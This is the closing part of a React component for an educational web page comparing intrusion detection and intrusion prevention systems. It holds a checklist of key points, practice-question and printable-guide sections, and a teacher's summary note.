              <div className="flex items-center gap-2 p-2.5 bg-slate-900 rounded border border-slate-800">
                <span className="text-emerald-400">✔</span>
                <span>IDS is passive and out-of-band; IPS is active and deployed directly in-line.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-slate-900 rounded border border-slate-800">
                <span className="text-emerald-400">✔</span>
                <span>IDS alerts on attacks; IPS drops malicious packets and terminates TCP sessions in real-time.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-slate-900 rounded border border-slate-800">
                <span className="text-emerald-400">✔</span>
                <span>IDS introduces zero latency; IPS introduces microsecond processing delay on the live wire.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-slate-900 rounded border border-slate-800">
                <span className="text-emerald-400">✔</span>
                <span>False positives in IDS cause alert fatigue; false positives in IPS cause legitimate business outages.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-slate-900 rounded border border-slate-800">
                <span className="text-emerald-400">✔</span>
                <span>Hardware Bypass switches use optical relays to fail-open during IPS power or hardware failure.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-slate-900 rounded border border-slate-800">
                <span className="text-emerald-400">✔</span>
                <span>Always run an IPS in detection-only mode for 30 days before enabling active inline blocking.</span>
              </div>
            </div>
          </div>
        </section>

        {/* 30 COMPREHENSIVE PRACTICE QUESTIONS & ANSWERS */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <FAQTemplate
            title="Differences between IDS and IPS FAQs"
            subtitle="30 In-depth Practice Questions & IPS Architecture Deep Dives"
            questions={questions}
          />
        </section>

        {/* PRINTABLE STUDY GUIDE NOTE */}
        <section className="space-y-4 animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <PlainTextPrint
            content={noteText}
            title="Differences between IDS and IPS (Printable Study Guide)"
            stampEnabled={true}
            showDownload={true}
            downloadButtonText="Download Note"
            downloadFileName="topic1_note.txt"
          />
        </section>

        {/* TEACHER SUKANTA HUI PROFILE FOOTER */}
        <footer className="pt-4">
          <Teacher
            note="Teacher's Note: Topic 1 highlights the critical operational divide between passive observation and active intervention! Always evaluate the trade-offs: an IDS guarantees zero latency and zero risk of self-inflicted business outages, making it ideal for internal database core backbones. Conversely, an inline IPS stops single-packet zero-days before they reach origin servers, but requires strict hardware optical bypass switches to fail-open and an essential 30-day tuning period to eliminate false-positive payment drops. In Topic 2, we will examine the comparison between Network-based IDS (NIDS) and Host-based IDS (HIDS)!"
          />
        </footer>

      </div>
    </div>
  );
};

export default Topic1;
